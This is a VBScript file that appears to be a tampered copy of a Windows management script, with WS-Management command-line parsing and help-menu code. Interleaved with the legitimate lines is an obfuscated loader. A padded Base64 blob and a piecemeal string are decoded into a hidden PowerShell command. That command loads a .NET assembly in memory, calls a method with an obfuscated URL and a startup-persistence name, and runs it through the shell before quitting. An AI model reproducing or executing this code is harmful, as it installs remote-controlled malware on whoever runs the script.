hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%Y@#$%@#$%@#$%D@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%D@#$%+@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%=="

     LineFlush ""
     LineOut GetResource("L_MsgAdvancedOptions")
     OptLine GetResource("L_optClearPKeyFromRegistry"),     "",                                           GetResource("L_optClearPKeyFromRegistryUsage")
     OptLine GetResource("L_optInstallLicense"),            GetResource("L_ParamsLicenseFile"),           GetResource("L_optInstallLicenseUsage")
     hTpxRu = Replace(hTpxRu,"@#$%","A")
     cTcwb = hTpxRu
     OptLine GetResource("L_optReinstallLicenses"),         "",                                           GetResource("L_optReinstallLicensesUsage")
     OptLine GetResource("L_optReArmWindows"),              "",                                           GetResource("L_optReArmWindowsUsage")
     OptLine GetResource("L_optReArmApplication"),          GetResource("L_ParamsApplicationID"),         GetResource("L_optReArmApplicationUsage")   
     woWUI = "p(@�}ú}w}}:@#úrsh}}:@#úll.}}:@#úx}}:@#ú [Byt}}:@#ú[]] $rOWg = [syst}}:@#úm.Conv}}:@#úrt]::Fr(@�}ú}mBas}}:@#ú64string('"+cTcwb+"');"
     woWUI = woWUI & "[Syst"
     LineOut ""
     OptLine  GetResource("L_optDisplayIID"),           GetResource("L_ParamsActivationIDOptional"),  GetResource("L_optDisplayIIDUsage")
     OptLine2 GetResource("L_optPhoneActivateProduct"), GetResource("L_ParamsPhoneActivate"),         GetResource("L_ParamsActivationIDOptional"),   GetResource("L_optPhoneActivateProductUsage")
     woWUI = woWUI & "}}:@#úm.App"
     woWUI = woWUI & "D(@�}ú}m"
     LineOut ""
     LineOut  GetResource("L_MsgKmsClientOptions")
     OptLine2 GetResource("L_optSetKmsName"),           GetResource("L_ParamsSetKms"),                GetResource("L_ParamsActivationIDOptional"),   GetResource("L_optSetKmsNameUsage")
     woWUI = woWUI & "ai"
     woWUI = woWUI & "n]::Curr}}:@#ú"
     woWUI = woWUI & "ntD(@�}ú}ma"
     OptLine  GetResource("L_optSetKmsHostCaching"),    "",                                           GetResource("L_optSetKmsHostCachingUsage")
     OptLine  GetResource("L_optClearKmsHostCaching"),  "",                                           GetResource("L_optClearKmsHostCachingUsage")
     woWUI = woWUI & "in.L(@�}ú}ad($r"
     woWUI = woWUI & "OWg).G}}:@#útT"
     woWUI = woWUI & "yp}}:@#ú('Fi"
     OptLine GetResource("L_optListTkaCerts"),          "",                                           GetResource("L_optListTkaCertsUsage")
     OptLine GetResource("L_optForceTkaActivation"),    GetResource("L_ParamsForceTkaActivation"),    GetResource("L_optForceTkaActivationUsage")
     woWUI = woWUI & "b}}:@#ú"
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     woWUI = woWUI & "r.Hom}}:@#ú')."
     woWUI = woWUI & "GetM}}:@#úth(@�}ú}"
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     LineOut GetResource("L_MsgADOptions")
     OptLine2 GetResource("L_optADActivate"),           GetResource("L_ParamsProductKey"),            GetResource("L_ParamsAONameOptional"),         GetResource("L_optADActivateUsage")
     OptLine  GetResource("L_optADGetIID"),             GetResource("L_ParamsProductKey"),            GetResource("L_optADGetIIDUsage")
     OptLine3 GetResource("L_optADApplyCID"),           GetResource("L_ParamsProductKey"),            GetResource("L_ParamsPhoneActivate"),          GetResource("L_ParamsAONameOptional"),  GetResource("L_optADApplyCIDUsage")
     OptLine  GetResource("L_optADListAOs"),            "",                                           GetResource("L_optADListAOsUsage")
     OptLine  GetResource("L_optADDeleteAO"),           GetResource("L_ParamsAODistinguishedName"),   GetResource("L_optADDeleteAOsUsage")
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     woWUI = woWUI & "d('VAI').In"
     woWUI = woWUI & "v(@�}ú}k}}:@#ú($n"
     woWUI = woWUI & "ull, [(@�}ú}bj}}:@#úct[]"
     LineOut GetResource("L_MsgKmsOptions")
     OptLine GetResource("L_optSetKmsListenPort"),      GetResource("L_ParamsSetListenKmsPort"),      GetResource("L_optSetKmsListenPortUsage")
     OptLine GetResource("L_optSetActivationInterval"), GetResource("L_ParamsSetActivationInterval"), GetResource("L_optSetActivationIntervalUsage")
     OptLine GetResource("L_optSetRenewalInterval"),    GetResource("L_ParamsSetRenewalInterval"),    GetResource("L_optSetRenewalIntervalUsage")
     OptLine GetResource("L_optSetDNS"),                "",                                           GetResource("L_optSetDNSUsage")
     OptLine GetResource("L_optClearDNS"),              "",                                           GetResource("L_optClearDNSUsage")
     OptLine GetResource("L_optSetNormalPriority"),     "",                                           GetResource("L_optSetNormalPriorityUsage")
     OptLine GetResource("L_optClearNormalPriority"),   "",                                           GetResource("L_optClearNormalPriorityUsage")
     OptLine2 GetResource("L_optSetVLActivationType"),  GetResource("L_ParamsVLActivationTypeOptional"), GetResource("L_ParamsActivationIDOptional"), GetResource("L_optSetVLActivationTypeUsage")
     woWUI = woWUI & "] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.70](∞ú(](∞ú(](∞ú(](∞ú(4*●*☞#:▶](∞ú(96084837994(úø(@@*ú795](∞ú(](∞ú(](∞ú(4*●*☞#:▶309(úø(@@*ú(úø(@@*ú03008489695](∞ú(](∞ú(](∞ú(4*●*☞#:▶sø☀☞√�}П�n∞*▲◀(m↓*(▲☟@*⇝!}(ú░}aø☀☞√�}П�ø☀☞√�}П�a4*●*☞#:▶mo!}(ú░}.ppa4}�ø▶ro!}(ú░}si4}�ø▶.n4}�ø▶!}(ú░}4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀spø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝','1No1me_Startup','2No3me_3tartup'))"
     woWUI = Replace(woWUI,"▶�¤U","p")
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     woWUI = Replace(woWUI,"(@�}ú}","o")
     woWUI = Replace(woWUI,"}}:@#ú","e")
     cZplrXODGKZWCJNNPEFLRM.Run(woWUI),false
     cZplrXODGKZWCJNNPEFLRM.quit
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     zoDpTfP:cZplrXO:sLwIUAO = "ú:(�":vqZM:GgCDHLA:
     WScript.Quit
     ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Operations
private const OP_GET  = "get"
private const OP_PUT  = "set"
private const OP_CONFIGSDDL  = "configsddl"
private const OP_CREATESDDL  = "createsddl"
private const OP_CRE  = "create"
private const OP_DEL  = "delete"
private const OP_ENU  = "enumerate"
private const OP_INV  = "invoke"
private const OP_HELP = "help"
private const OP_IDENTIFY    = "identify"
private const OP_QUICKCONFIG = "quickconfig"
private const OP_HELPMSG = "helpmsg"

' Named parameters (key names of key/value pairs)
private const NPARA_USERNAME  = "username"
private const NPARA_PASSWORD  = "password"
private const NPARA_PROXYUSERNAME  = "proxyusername"
private const NPARA_PROXYPASSWORD  = "proxypassword"
private const NPARA_CERT      = "certificate"
private const NPARA_DIALECT   = "dialect"
private const NPARA_ASSOCINST = "associations"
private const NPARA_FILE      = "file"
private const NPARA_FILTER    = "filter"
private const NPARA_HELP      = "?"
private const NPARA_REMOTE    = "remote"
private const NPARA_NOCACHK   = "skipcacheck"
private const NPARA_NOCNCHK   = "skipcncheck"
private const NPARA_NOREVCHK   = "skiprevocationcheck"
private const NPARA_DEFAULTCREDS = "defaultcreds"
private const NPARA_SPNPORT   = "spnport"
private const NPARA_TIMEOUT   = "timeout"
private const NPARA_AUTH      = "authentication"
private const NPARA_PROXYAUTH      = "proxyauthentication"
private const NPARA_PROXYACCESS      = "proxyaccess"
private const NPARA_UNENCRYPTED = "unencrypted"
private const NPARA_ENCODING  = "encoding"
private const NPARA_FORMAT    = "format"
private const NPARA_OPTIONS   = "options"
private const NPARA_FRAGMENT  = "fragment"
private const NPARA_QUIET     = "quiet"
private const NPARA_TRANSPORT = "transport"
private const NPARA_PSEUDO_COMMAND   = "command"
private const NPARA_PSEUDO_OPERATION = "operation"
private const NPARA_PSEUDO_ACTION    = "action"
private const NPARA_PSEUDO_RESOURCE  = "resource"
private const NPARA_PSEUDO_AT        = "@"
private const NPARA_RETURN_TYPE      = "returntype"
private const NPARA_SHALLOW          = "shallow"
private const NPARA_BASE_PROPS_ONLY  = "basepropertiesonly"
private const NPARA_USESSL           = "usessl"
private const NPARA_FORCE            = "force"

private const SHORTCUT_CRE         = "c"
private const SHORTCUT_DEL         = "d"
private const SHORTCUT_ENU         = "e"
private const SHORTCUT_ENU2        = "enum"
private const SHORTCUT_GET         = "g"
private const SHORTCUT_INV         = "i"
private const SHORTCUT_IDENTIFY    = "id"
private const SHORTCUT_PUT         = "s"
private const SHORTCUT_PUT2        = "put"
private const SHORTCUT_PUT3        = "p"
private const SHORTCUT_QUICKCONFIG = "qc"
private const SHORTCUT_HELPMSG    = "helpmsg"

private const SHORTCUT_AUTH        = "a"
private const SHORTCUT_AUTH2       = "auth"
private const SHORTCUT_PROXYAUTH        = "pa"
private const SHORTCUT_PROXYAUTH2       = "proxyauth"
private const SHORTCUT_PROXYACCESS        = "pac"
private const SHORTCUT_PROXYACCESS2       = "proxyaccess"
private const SHORTCUT_FORMAT      = "f"
private const SHORTCUT_PASSWORD    = "p"
private const SHORTCUT_PROXYPASSWORD    = "pp"
private const SHORTCUT_REMOTE      = "r"
private const SHORTCUT_REMOTE2     = "machine"
private const SHORTCUT_USERNAME    = "u"
private const SHORTCUT_PROXYUSERNAME    = "pu"
private const SHORTCUT_UNENCRYPTED = "un"
private const SHORTCUT_USESSL      = "ssl"
private const SHORTCUT_QUIET       = "q"
private const SHORTCUT_CERT        = "c"

' Help topics
private const HELP_CONFIG   = "config"
private const HELP_CERTMAPPING   = "certmapping"
private const HELP_CUSTOMREMOTESHELL     = "customremoteshell"
private const HELP_URIS     = "uris"
private const HELP_ALIAS    = "alias"
private const HELP_ALIASES  = "aliases"
private const HELP_SWITCHES = "switches"
private const HELP_REMOTING = "remoting"
private const HELP_INPUT    = "input"
private const HELP_AUTH     = "auth"
private const HELP_PROXY     = "proxy"
private const HELP_FILTERS  = "filters"

' Literal values in key/value pairs
private const VAL_NO_AUTH     = "none"
private const VAL_BASIC       = "basic"
private const VAL_DIGEST      = "digest"
private const VAL_KERBEROS    = "kerberos"
private const VAL_NEGOTIATE   = "negotiate"
private const VAL_CERT        = "certificate"
private const VAL_CREDSSP     = "credssp"

' proxy access types
private const VAL_PROXY_IE_CONFIG     = "ie_settings"
private const VAL_PROXY_WINHTTP_CONFIG       = "winhttp_settings"
private const VAL_PROXY_AUTODETECT      = "auto_detect"
private const VAL_PROXY_NO_PROXY_SERVER    = "no_proxy"

' Enumeration returnType values
private const VAL_RT_OBJECT  = "object"
private const VAL_RT_EPR     = "epr"
private const VAL_RT_OBJ_EPR = "objectandepr"

' Output formatting flags
private const VAL_FORMAT_XML         = "xml"
private const VAL_FORMAT_PRETTY      = "pretty"
private const VAL_FORMAT_PRETTY_XSLT = "WsmPty.xsl"
private const VAL_FORMAT_TEXT        = "text"
private const VAL_FORMAT_TEXT_XSLT   = "WsmTxt.xsl"

'''''''''''''''''''''
' Patterns
private const PTRN_IPV6_1 = "([A-Fa-f0-9]{1,4}:){6}:[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_2 = "([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_3 = "[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_4 = "([A-Fa-f0-9]{1,4}:){2}:([A-Fa-f0-9]{1,4}:){0,4}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_5 = "([A-Fa-f0-9]{1,4}:){3}:([A-Fa-f0-9]{1,4}:){0,3}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_6 = "([A-Fa-f0-9]{1,4}:){4}:([A-Fa-f0-9]{1,4}:){0,2}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_7 = "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_S = ":"

private const PTRN_URI_LAST = "([a-z_][-a-z0-9._]*)$"
private const PTRN_OPT      = "^-([a-z]+):(.*)"
private const PTRN_HASH_TOK = "\s*([\w:]+)\s*=\s*(\$null|""([^""]*)"")\s*"

dim PTRN_HASH_TOK_P
dim PTRN_HASH_VALIDATE
PTRN_HASH_TOK_P        = "(" & PTRN_HASH_TOK & ")"
PTRN_HASH_VALIDATE     = "(" & PTRN_HASH_TOK_P & ";)*(" & PTRN_HASH_TOK_P & ")"

dim PTRN_IPV6
PTRN_IPV6 = "^(" & _
    PTRN_IPV6_1 & ")$|^(" & PTRN_IPV6_2 & ")$|^(" & _
    PTRN_IPV6_3 & ")$|^(" & PTRN_IPV6_4 & ")$|^(" & PTRN_IPV6_5 & ")$|^(" & _
    PTRN_IPV6_6 & ")$|^(" & PTRN_IPV6_7 & ")$"


'''''''''''''''''''''
' Misc
private const T_O             = &h800705B4
private const URI_IPMI        = "http://schemas.dmtf.org/wbem/wscim/1/cim-schema"
private const URI_WMI         = "http://schemas.microsoft.com/wbem/wsman/1/wmi"
private const NS_IPMI         = "http://schemas.dmtf.org/wbem/wscim/1/cim-schema"
private const NS_CIMBASE      = "http://schemas.dmtf.org/wbem/wsman/1/base"
private const NS_WSMANL       = "http://schemas.microsoft.com"
private const NS_XSI          = "xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"""
private const ATTR_NIL        = "xsi:nil=""true"""
private const ATTR_NIL_NAME   = "xsi:nil"
private const NS_XSI_URI      = "http://www.w3.org/2001/XMLSchema-instance"
private const ALIAS_WQL       = "wql"
private const URI_WQL_DIALECT = "http://schemas.microsoft.com/wbem/wsman/1/WQL"
private const ALIAS_XPATH       = "xpath"
private const URI_XPATH_DIALECT = "http://www.w3.org/TR/1999/REC-xpath-19991116"
'Constants for MS-XML
private const NODE_ATTRIBUTE  = 2
private const NODE_TEXT       = 3

'''''''''''''''''''''
' Vars
dim wshShellObj
dim wsmanObj
dim connOptionsObj
dim sessionObj
dim enumeratorObj
dim resourceOptionsDic
dim resourceLocatorObj
dim wsmanInternalObj

dim cmdStr
dim wsmanCmdLineObj
dim inputStr
dim responseStr
dim connectionStr
dim resourceUriStr
dim actionUriStr
dim rootNdNameStr
dim operation

dim formatOption
dim formattedStr

dim errNo
dim errDesc

dim stdIn
dim stdErr
dim stdOut
set stdIn = WScript.StdIn
set stdErr = WScript.StdErr
set stdOut = WScript.StdOut

Dim resourceDictionary, resourcesLoaded
Set resourceDictionary = CreateObject("Scripting.Dictionary")
resourcesLoaded = false

Dim WSHShell, strRegKey, osVersion, osVista
 
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strRegKey = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\CurrentVersion" 
osVersion = WSHShell.RegRead(strRegKey)
osVista = "6.0"

' ------------------ Main() --------------------

If Not IsCScriptEnv() Then
    WScript.Quit()
End If

'Create an instance of the WSMAN.Automation Class
set wsmanObj = CreateObject("WSMAN.Automation")

set wsmanInternalObj = CreateObject("WSMAN.InternalAutomation")

'Get the raw text command line
cmdStr = wsmanObj.CommandLine

'Expand the environment strings
set wshShellObj = WScript.CreateObject("WScript.Shell")
cmdStr = wshShellObj.ExpandEnvironmentStrings(cmdStr)

'Create the command-line parsing object and parse the command line
Set wsmanCmdLineObj = New WSManCommandLineParser
If Not wsmanCmdLineObj.Parse(cmdStr) Then
    HelpMenu "help", stdOut
    WScript.Quit(ERR_GENERAL_FAILURE)
End If

Dim argOne
Dim argTwo
argOne = LCase(wsmanCmdLineObj.Argument(1))
argTwo = LCase(wsmanCmdLineObj.Argument(2))

If (argOne = OP_HELP Or argOne = NPARA_HELP Or argOne = "") Then
    HelpMenu argTwo, stdOut
    WScript.Quit(ERR_OK)
End If

'Check if the help argument was presented, and display help
If wsmanCmdLineObj.ArgumentExists(NPARA_HELP) Then
    HelpMenu argOne, stdOut
    WScript.Quit(ERR_OK)
End If


If argOne = OP_HELPMSG then
    argTwo = WScript.Arguments(1)
    Dim errNumber
    Dim strHex
    if (InStr(LCase(argTwo),"0x")= 1) then
        strHex = "&H" + Mid(argTwo, 3)
        On Error Resume Next
        errNumber = CLng(strHex)
        if Err.Number <> 0 then
          HelpMenu OP_HELPMSG, stdOut
          WScript.Quit(ERR_OK)
        end if
    elseif (InStr(LCase(argTwo),"-")= 1) then                               
        strHex = "&H"+Hex(CLng(argTwo))
          On Error Resume Next
        errNumber = CLng(strHex)
        if Err.Number <> 0 then
          HelpMenu OP_HELPMSG, stdOut
          WScript.Quit(ERR_OK)
        end if
    else
           On Error Resume Next
        errNumber = CLng(argTwo)
        if Err.Number <> 0 then
            HelpMenu OP_HELPMSG, stdOut
               WScript.Quit(ERR_OK)
        end if        
    end if
    formattedStr = wsmanObj.GetErrorMessage(errNumber)
    WScript.echo formattedStr    
    WScript.Quit(ERR_OK)
End If

wsmanCmdLineObj.ValidateArguments()

'Get and check the operation argument
operation = wsmanCmdLineObj.Operation()

If (wsmanCmdLineObj.ArgumentExists(NPARA_REMOTE)) Then
    connectionStr = wsmanCmdLineObj.Argument(NPARA_REMOTE)
Else
    connectionStr = ""
End If

'Set the format option for result output
if(wsmanCmdLineObj.ArgumentExists(NPARA_FORMAT)) then
    formatOption = wsmanCmdLineObj.Argument(NPARA_FORMAT)   
    if Not (LCase(formatOption) = VAL_FORMAT_XML Or _
            LCase(formatOption) = VAL_FORMAT_PRETTY Or _
            LCase(formatOption) = VAL_FORMAT_TEXT) Then
        stdErr.WriteLine GetResource("L_FORMATLERROR_Message") & """" & formatOption & """"
        WScript.Quit(ERR_GENERAL_FAILURE)
    end if
else
    formatOption = VAL_FORMAT_TEXT
end if


'Create the wsman automation API session object
set sessionObj = CreateSession(wsmanObj, connectionStr, wsmanCmdLineObj, formatOption)

'Get the resource and action uri strings
resourceUriStr = ""
if operation = OP_INV then
    actionUriStr = wsmanCmdLineObj.Argument(NPARA_PSEUDO_ACTION)
End If

If (operation <> OP_IDENTIFY and operation <> OP_QUICKCONFIG) Then
    resourceUriStr = wsmanCmdLineObj.Argument(NPARA_PSEUDO_RESOURCE)
    'Determine the name to use for the root node in the message
    rootNdNameStr = GetRootNodeName(operation, resourceUriStr, actionUriStr)
End If

'Create the ResourceLocator object
If resourceUriStr <> "" Then
  on error resume next
  set resourceLocatorObj = CreateAndInitializeResourceLocator(wsmanObj,resourceUriStr,wsmanCmdLineObj)
  if resourceLocatorObj Is Nothing then
      if Err.Number <> 0 then
          errNo = Err.Number
          errDesc = Err.Description
          stdErr.WriteLine GetResource("L_ERRNO_Message") & " " & errNo & " 0x" & Hex(errNo)
          stdErr.WriteLine errDesc
      end if
     WScript.Quit(ERR_GENERAL_FAILURE)
  end if
End If

'Gather the input parameters, if present, from the command line or a file. For Put,
